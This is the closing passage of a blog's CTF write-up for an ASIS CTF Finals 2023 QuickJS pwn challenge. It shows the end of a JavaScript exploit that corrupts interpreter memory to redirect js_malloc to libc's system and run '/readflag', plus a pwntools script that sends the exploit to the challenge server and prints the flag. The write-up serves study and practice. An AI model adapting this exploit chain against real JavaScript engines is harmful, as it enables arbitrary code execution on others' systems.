</span></span><span class="line"><span class="cl"><span class="nx">rt_mf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-=</span> <span class="p">(</span><span class="mh">0xf30</span><span class="o">-</span><span class="mh">0x2a0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Overwrite Float64Array-&gt;buffer stored pointer to rt-&gt;mf
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">z</span><span class="p">[</span><span class="mi">83</span><span class="p">][</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="nx">u2d</span><span class="p">(</span><span class="nx">rt_mf</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nx">rt_mf</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Overwrite rt-&gt;mf.js_malloc to system
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">let</span> <span class="nx">system</span> <span class="o">=</span> <span class="nx">d2u</span><span class="p">(</span><span class="nx">leaked_libc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">system</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-=</span> <span class="p">(</span><span class="mh">0x1fed00</span><span class="o">-</span><span class="mh">0x55230</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">z</span><span class="p">[</span><span class="mi">83</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">u2d</span><span class="p">(</span><span class="nx">system</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nx">system</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Create new ArrayBuffer to trigger system(&#34;/readflag&#34;)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">let</span> <span class="nx">abuf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After sending this code to the server, we can retrieve our flag.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;5.75.200.150&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;exploit.js&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">-- EOF --</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><img src="https://i.imgur.com/AkLzhrA.png"/>
<blockquote>
<p><strong>Flag: ASIS{i_hope_think_they_accept_my_proposal-fd23134fd23134}</strong></p>
</blockquote>
<h1 id="social-media">Social Media</h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>
                    
                </span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/asis-ctf-finals-2023/" data-title="ASIS CTF Finals 2023" data-via="Chovid99" data-hashtags="Writeup,ASIS CTF,pwn,quickjs,huffman,oob,2023"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/asis-ctf-finals-2023/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/asis-ctf/">ASIS CTF</a>,&nbsp;<a href="/tags/pwn/">pwn</a>,&nbsp;<a href="/tags/quickjs/">quickjs</a>,&nbsp;<a href="/tags/huffman/">huffman</a>,&nbsp;<a href="/tags/oob/">oob</a>,&nbsp;<a href="/tags/2023/">2023</a></section>
        <section>
            
        </section>
    </div>

    <div class="post-nav"><a href="/posts/0ctf-tctf-2023/" class="prev" rel="prev" title="0CTF/TCTF 2023"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>0CTF/TCTF 2023</a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/Chovid99" target="_blank">Chovid99</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
</html>
